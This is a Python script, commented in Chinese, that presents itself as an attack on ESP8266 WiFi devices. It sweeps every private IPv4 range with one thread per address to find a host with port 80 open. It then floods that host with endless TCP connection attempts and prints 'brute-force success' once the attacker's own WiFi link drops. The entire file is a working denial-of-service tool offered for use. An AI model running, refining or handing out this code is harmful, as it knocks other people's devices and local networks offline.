# coding=utf-8
# python攻击ESP8266,建议知道端口
import ipaddress
import pywifi
import sys
import threading
import time
from socket import *

wifi = pywifi.PyWiFi()  # 初始化PyWiFi类
ifaces = wifi.interfaces()[0]  # 获取第一张网卡
start_ip = "0.0.0.0"
end_ip = "255.255.255.255"
stop_traversal = False  # 控制循环终止的标志
address_ip, port_ip = "", ""
i = 0


def traverse_ip_addresses(start_ip, end_ip):
    start = ipaddress.IPv4Address(start_ip)
    end = ipaddress.IPv4Address(end_ip)
    for ip_int in range(int(start), int(end) + 1):
        cur_ip = ipaddress.IPv4Address(ip_int)
        if stop_traversal:
            break
        if cur_ip == ipaddress.IPv4Address("0.0.0.0") or cur_ip == ipaddress.IPv4Address("255.255.255.255"):
            continue
        t = threading.Thread(target=fun, args=(cur_ip,), name=f"Thread-{cur_ip}")
        t.start()


def fun(address):
    port = 80
    while True:
        s = socket(AF_INET, SOCK_STREAM)
        s.settimeout(2)  # 设置连接超时时间为2秒
        result = s.connect_ex((str(address), port))
        if stop_traversal:
            break
        if result == 0:
            print(f"Connected to {address}:{port}")
            fs(address, port)
            break
        else:
            s.close()


def fs(address, port):
    global stop_traversal, address_ip, port_ip
    while True:
        time.sleep(1)
        stop_traversal = True
        connect_time = int(time.time() - start_time)
        print(f"连接成功! ip:{address},端口{port},使用时间:{connect_time}")
        address_ip = address
        port_ip = port
        break


def fa(address, port):
    global i
    while True:
        s = socket(AF_INET, SOCK_STREAM)
        result = s.connect_ex((str(address), port))
        i = i + 1
        wifistatus = ifaces.status()  # 获取链接情况， 0就是未连接
        if wifistatus == 0:
            print(f"爆破次数:{i},爆破成功！")
            sys.exit(0)
        print(f"爆破次数:{i}")


if __name__ == '__main__':
    wifistatus = ifaces.status()  # 获取链接情况， 0就是未连接
    if wifistatus == 0:
        print('当前未连接WiFi,请检查连接情况')
        sys.exit(0)
    else:
        print("当前已连接WiFi")
    start_time = time.time()
    print("开始通过ip地址和端口连接WiFi原本地址,请等待.....")
    t_1 = threading.Thread(target=traverse_ip_addresses, args=("10.0.0.0", "10.255.255.255"))
    t_2 = threading.Thread(target=traverse_ip_addresses, args=("172.16.0.0", "172.31.255.255"))
    t_3 = threading.Thread(target=traverse_ip_addresses, args=("192.168.0.0", "192.168.255.255"))
    t_1.start()
    t_2.start()
    t_3.start()
    while True:
        if stop_traversal:
            t_1.join()
            t_2.join()
            t_3.join()
            print(f"开始包爆破{address_ip}-{port_ip}")
            t_1 = threading.Thread(target=fa, args=(address_ip, port_ip))
            t_2 = threading.Thread(target=fa, args=(address_ip, port_ip))
            t_3 = threading.Thread(target=fa, args=(address_ip, port_ip))
            t_1.start()
            t_2.start()
            t_3.start()
            break
